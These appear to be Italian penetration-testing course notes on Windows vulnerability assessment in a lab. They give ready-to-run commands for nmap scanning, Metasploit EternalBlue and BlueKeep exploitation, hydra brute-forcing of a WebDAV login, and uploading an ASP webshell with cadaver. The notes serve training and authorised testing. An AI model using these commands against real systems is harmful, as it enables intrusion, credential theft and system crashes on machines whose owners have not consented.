# Vulnerability Assessment

Tipi di vulnerabilità Windows:

* Information disclosure
* Buffer overflow
* Remote code execution
* Privilege escalation
* Denial of Service (DoS)

<figure><img src="../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

## Vulnerability Scanning con Metasploit Framework (MSF)

### Scan degli IP nella rete

```
sudo nmap -sn 10.10.10.1/24
```

### Setup workspace MSF e scan servizi IP target

```
service postgresql start
msfconsole
setg RHOSTS 10.10.10.4
workspace -a MS3 //metasploitable 3
db_nmap -sS -sV -O 10.10.10.4 //consente di fare uno scan dentro msf e imposta automaticamente i dati nel db msf.

hosts
services
```

### Cercare moduli exploit dentro MSF

```
search type:exploit name:Microsoft IIS
```

### searchsploit: Cercare exploit (tra cui moduli MSF) da bash linux

```
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit" //è case sensitive
```

### analyze: Comando per trovare exploit per i servizi salvati nel DB MSF

Analizza il contenuto del database metasploit (host e services) e ci mostra una serie di exploit per le vulnerabilità presenti per host e servizi.

```
analyze
vulns
```

Il comando vulns invece ci mostra  le vulnerabilià con realtiva CVE.

### Eternal Blue: esempio con target vulnerabile

#### Test se target vulnerabile a Eternal Blue tramite modulo MSF auxiliary

```
use auxiliary/scanner/smb/smb_ms17_010
```

#### Uso del modulo MSF per exploit vulnerabilità Eternal Blue

```
use exploit/windows/smb/ms17_010_eternalblue
// il payload di default è per windows x64 quindi ci va bene
show options
run
```

Dovremmo settare LHOST e LPORT che in realtà LHOST è già corretto, mentre per LPORT ci basta aprire una connessione in ascolto su quella porta, che però ci aprirà in realtà in automatico il modulo.

### Plugin MSF db\_autopwn

Identifica i moduli exploit per le porte aperte sul sistema, e fornisce una lista di tutti gli exploit disponibili per i servizi con porte aperte.

#### Installazione DB autopawn

```
cd Downloads/
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
// Torniamo in metasploit
load db_autopawn
db_autopawn
```

#### Utilizzo di DB autopawn in metasploit (MSF)

```
db_autopwn -p -t -PI 445 //per SMB port come target
```

## WebDAV vulnerabilities

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Nmap scan dei servizi

```
nmap -sV -sC 10.2.17.124
nmap -sV -p 80 --script=http-enum 10.2.17.124
```

E identifichiamo se alla porta HTTP (80 e 443) troviamo Microsoft IIS con webdav.

La pagina che ospita WebDAV richiede autenticazione tramite web authentication form.

### hydra: Brute force web authentication form

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
// http-get è il tipo di richiesta, mentre /webdav/ è la pagina dove si trova l'authentication formdavtest: Identificare estensioni file eseguibili e operazioni supportate da WebDav
```

### davtest: Identificare estensioni file supportate ed eseguibili da WebDav

```
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```

Quello che fa è dirci quali file possiamo caricare ed eseguire sul server.&#x20;

Ad esempio possiamo eseguire file asp, e significa che possiamo creare dei payload in asp da inserire ed eseguire, come ad esempio una remote shell.

### cadaver: Caricare file e webshell su WebDav

Cadaver ci consente di fare upload, download di file nella directory WebDav.

```
cadaver http://10.2.17.124/webdav
// chiede poi username e password, e ci connette alla directory
put /usr/share/webshells/asp/webshell.asp
```

Ricarichiamo la pagina web di webdav e vediamo infatti la webshell.asp, la clicchiamo e utilizziamo.

### Utile: Directory con tutte le webshell

```
ls -al /usr/share/webshells/
```

## Vulnerability Analysis: EternalBlue (MS17-010) - SMB

<figure><img src="../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

### Scan Nmap per vedere OS e porta SMB

```
sudo nmap -sV -p 445 -O 10.10.10.12
```

### Scan Nmap per verificare se SMB è vulnerabile a EternalBlue

```
sudo nmap -sV -p 445  --script=smb-vuln-ms17-010 10.10.10.12
```

### Exploit manuale con AutoBlue-MS17-010

Seguire le indicazioni sul github ed eventualmente gli appunti dettagliati.

{% embed url="https://github.com/3ndG4me/AutoBlue-MS17-010" %}

### Exploit automatico con Metasploit Framework

```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.12 //target IP
exploit
```

#### Per verificare se è vulnerabile

è possibile utilizzare questo modulo auxiliary:

```
use auxiliary/scanner/smb/smb_ms17_010
```

## Vulnerability Analysis: BlueKeep (CVE-2019-0708) - RDP

<figure><img src="../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

Deve essere abilitato RDP e disabilitata la Network Level authentication. E quindi per mitigare si può abilitare la Network Level Authentication.

**Modificare ed eseguire codice al kernel level è probabile risulti in crash del sistema.**

### Test porta RDP 3389 aperta

```
sudo nmap -p 3389 10.10.10.7
```

### Esecuzione exploit con modulo di Metasploit Framework

```
msfconsole
search BlueKeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP target>
run
```

#### Esecuzione exploit su target vulnerabile

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show options
set RHOSTS 10.10.10.7
show targets
set target 2
```

è uno staged payload, e funziona solo su Windows a 64 bit.

Nel nostro caso il target è un Windows 7 SP1 build 7601 x64 su Virtualbox. Quindi impostiamo il numero 2.

Aspettiamo di capire se sta funzionando, ha settato la dimensione del CHUNK grooming strategy (groom size) a 250MB, ma questo dipende dalla RAM allocata per la macchina target, quindi potrebbe essere da cambiare. Se questo valore è troppo alto può causare il crash della macchina target.

**In casi reali in cui abbiamo come target un sistema di una azienda bisogna assolutamente fare attenzione ad avviare degli exploit che sfruttano il kernel. Perché possono causare crash e perdite di memoria.**

